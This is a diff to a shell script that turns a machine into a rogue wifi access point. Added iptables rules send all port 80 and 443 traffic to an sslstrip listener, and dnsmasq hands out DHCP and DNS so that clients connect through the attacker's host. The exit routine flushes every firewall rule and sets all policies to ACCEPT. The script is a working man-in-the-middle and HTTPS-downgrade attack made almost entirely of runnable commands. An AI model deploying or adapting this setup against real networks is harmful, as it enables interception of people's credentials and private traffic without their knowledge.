@@ -21,6 +21,11 @@ Exit() {
   killall dnsmasq
   stop_service "nginx"
   start_service "NetworkManager"
+  iptables -P INPUT ACCEPT
+  iptables -P FORWARD ACCEPT
+  iptables -P OUTPUT ACCEPT
+  iptables --flush
+  iptables --flush -t nat
   exit
 }
 
@@ -31,9 +36,9 @@ if [ "$EUID" -ne 0 ]
   exit
 fi
 
-SSLSTRIP_PORT=10000
-INTERFACE1="enp1s0f1"
-INTERFACE2="wlp2s0"
+SSLSTRIP_PORT=10000   # the port on which sslstrip should listen
+INTERFACE1="enp1s0f1"   # the first interface (typically lan)
+INTERFACE2="wlp2s0"   # the second interface (must be a wifi interface)
 
 detect_init() {
   # init process is pid 1
@@ -162,10 +167,8 @@ stop_service "NetworkManager"
 nmcli r wifi off
 rfkill unblock wlan
 
-ifconfig $INTERFACE1 down
 ifconfig $INTERFACE2 down
-ifconfig $INTERFACE1 192.168.0.1 netmask 255.255.255.0 up
-ifconfig $INTERFACE2 192.168.0.100 netmask 255.255.255.0 up
+ifconfig $INTERFACE2 10.0.0.1/24 up
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
@@ -175,9 +178,9 @@ iptables --delete-chain
 iptables --table nat --delete-chain
 iptables --table nat --append POSTROUTING --out-interface $INTERFACE2 -j MASQUERADE
 iptables --append FORWARD --in-interface $INTERFACE1 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $SSLSTRIP_PORT
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $SSLSTRIP_PORT
 iptables -t nat -A POSTROUTING -j MASQUERADE
-iptables -A FORWARD -i $INTERFACE1 -o $INTERFACE2 -m state --state RELATED,ESTABLISHED -j ACCEPT
-iptables -A FORWARD -i $INTERFACE2 -o $INTERFACE1 -j ACCEPT
 
 echo "Launching DHCP + DNS Server dnsmasq..."
 dnsmasq -C dnsmasq.conf &
